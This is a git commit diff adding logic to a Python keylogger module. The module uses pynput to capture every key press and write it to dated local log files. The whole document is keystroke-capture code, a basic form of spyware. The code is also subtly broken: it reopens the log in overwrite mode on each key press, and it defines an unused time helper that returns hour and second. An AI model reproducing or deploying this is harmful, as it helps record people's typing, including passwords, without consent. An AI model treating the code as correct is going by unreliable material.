e1887e0100f76ce98fc1a0d7f46c16d0708606e2
NaveTwizer <86551796+NaveTwizer@users.noreply.github.com>
2022-08-07 16:56:36 +0300

    Update keylogging.py

--- modules/keylogging.py
+++ modules/keylogging.py
@@ -1,13 +1,34 @@
 from pynput.keyboard import Listener
 import os
+from datetime import datetime as dt
 
-#import MyModule
 
+def setup():
+    now = dt.now()
+    if not os.path.exists('Logs'):
+        os.mkdir('Logs')
+    if not os.path.exists(f'Logs/{now.month}'):
+        os.mkdir(f'Logs/{now.month}')
+    if not os.path.exists(f'Logs/{now.month}/{now.day}.txt'):
+        with open(f'Logs/{now.month}/{now.day}.txt', 'w') as f:
+            f.close()
+      
+    
+def get_time():
+    now = dt.now()
+    return f'{now.hour}:{now.second}'
 def on_press(key):
     key = str(key)
-    print(key)
-    #MyModule.test()
+    now = dt.now()
+    with open(f'Logs/{now.month}/{now.day}.txt', 'w') as f:
+        f.write(key + '\n')
+        f.close()
+ 
 
+def main():
+    setup()
+    with Listener(on_press=on_press) as listener:
+        listener.join()
 
-with Listener(on_press=on_press) as listener:
-    listener.join()
+if __name__ == '__main__':
+    main()
